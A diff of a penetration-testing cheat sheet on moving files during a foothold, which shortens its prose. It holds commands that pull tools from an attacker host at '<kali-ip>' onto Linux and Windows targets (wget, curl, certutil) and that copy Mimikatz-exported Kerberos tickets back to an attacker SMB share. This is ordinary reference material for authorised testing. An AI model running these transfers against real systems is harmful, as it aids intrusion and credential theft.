@@ -2,21 +2,21 @@
 
 [← Foothold quick reference](../02-foothold.md)
 
-Serve a known directory and check the received file's length or checksum before running it.
+Verify received length/checksum before execution.
 
 ```bash
 python3 -m http.server 8000
 impacket-smbserver share /path/to/files -smb2support
 ```
 
-From a Linux target:
+Linux target:
 
 ```bash
 wget http://<kali-ip>:8000/file -O /tmp/file
 curl http://<kali-ip>:8000/file -o /tmp/file
 ```
 
-From a Windows target:
+Windows target:
 
 ```powershell
 certutil -urlcache -split -f http://<kali-ip>:8000/file.exe file.exe
@@ -25,24 +25,24 @@ Invoke-WebRequest http://<kali-ip>:8000/file.exe -OutFile file.exe
 
 ## Authenticated SMB share
 
-On Kali, share the directory where the file should land:
+Kali SMB share:
 
 ```bash
 sudo impacket-smbserver share . -smb2support -user <share-user> -password '<share-password>'
 ```
 
-From Windows, map the named share and copy to that share name, not just the server root:
+Windows → named share:
 
 ```cmd
 net use \\<KALI-IP>\share /user:<share-user> <share-password>
 copy C:\Temp\file.bin \\<KALI-IP>\share\file.bin
 ```
 
-`net view \\<KALI-IP>` shows advertised shares; it does not prove the current account can write to one. Check the copied file on Kali.
+`net view \\<KALI-IP>` lists shares; verify write and copied file.
 
 ## PowerShell paths containing brackets
 
-Mimikatz ticket exports can contain `[` and `]`. PowerShell's ordinary `-Path` treats them as wildcard characters. Use `-LiteralPath` and rename the destination:
+Ticket filename contains `[`/`]`: use PowerShell `-LiteralPath`:
 
 ```powershell
 Copy-Item -LiteralPath 'C:\Temp\[ticket-id]-user@service.kirbi' `
@@ -50,4 +50,4 @@ Copy-Item -LiteralPath 'C:\Temp\[ticket-id]-user@service.kirbi' `
 Test-Path -LiteralPath '\\<KALI-IP>\share\ticket.kirbi'
 ```
 
-If a transfer over `/dev/tcp` returns an HTTP response, strip its headers before treating the body as a file. Verify the length or checksum before running a transferred binary.
+`/dev/tcp` HTTP transfer includes headers; strip them and verify checksum.
